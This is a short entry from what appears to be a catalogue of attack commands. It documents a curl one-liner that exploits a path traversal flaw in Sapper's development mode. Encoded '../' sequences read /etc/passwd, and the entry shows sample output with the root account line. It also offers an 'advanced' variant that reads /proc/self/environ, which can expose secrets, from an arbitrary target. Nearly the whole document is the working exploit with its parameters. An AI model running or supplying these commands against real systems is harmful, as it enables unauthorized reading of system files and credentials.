---
id: cmd-005
data: >-
  curl -vv
  http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
tags:
  - exploit
  - curl
type: command
output: |-
  < HTTP/1.1 200 OK
  ... root:x:0:0:root:/root:/bin/bash
  (sensitive file contents)
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:11.527Z'
verified: false
validated: true
submitted: true
---
---

# curl-dev-path-traversal

## Command

```bash
curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## Description

Sends a verbose GET request to exploit path traversal in Sapper dev mode, using single URL-encoded '../' to read /etc/passwd.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-vv` | Verbose output | Yes |
| `http://localhost:3000/...` | Malicious URL with %2e%2e | Yes |

## Examples

### Basic Usage

```bash
curl -vv http://localhost:3000/client/.../etc/passwd
```

### Advanced Usage

```bash
curl -vv -H "User-Agent: Mozilla" http://target/.../proc/self/environ
```

## Expected Output

HTTP details and file contents in response body.

## Related

- [[Related Procedure: Exploit-Path-Traversal-in-Development-Mode]]

---
